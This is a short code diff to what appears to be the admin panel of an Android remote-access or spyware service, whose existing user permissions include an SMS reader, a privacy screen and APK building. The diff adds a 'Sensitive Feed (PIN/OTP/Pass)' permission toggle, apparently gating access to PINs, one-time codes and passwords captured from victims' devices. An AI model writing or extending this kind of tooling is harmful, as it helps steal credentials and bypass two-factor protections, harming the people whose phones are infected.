@@ -353,6 +353,7 @@
             const smsActive = isAdmin || perms.sms === true;
             const notifActive = isAdmin || perms.notification === true;
             const privacyActive = isAdmin || perms.privacy_screen === true;
+            const sensitiveActive = isAdmin || perms.sensitive_feed === true;
             const buildActive = perms.build_apk !== false;
 
             const lastLogin = u.last_login_formatted || (u.last_login ? new Date(u.last_login).toLocaleString() : 'Recently');
@@ -385,6 +386,9 @@
                 </td>
                 <td style="padding: 16px 20px;">
                     <div style="display: flex; flex-wrap: wrap; gap: 6px;">
+                        <span class="permission-toggle ${sensitiveActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'sensitive_feed', ${!sensitiveActive})">
+                            <i class="fas ${sensitiveActive ? 'fa-key' : 'fa-lock'}"></i> Sensitive Feed (PIN/OTP/Pass)
+                        </span>
                         <span class="permission-toggle ${smsActive ? 'active' : 'locked'}" onclick="toggleUserPermission('${uid}', 'sms', ${!smsActive})">
                             <i class="fas ${smsActive ? 'fa-envelope-open' : 'fa-lock'}"></i> SMS Reader
                         </span>
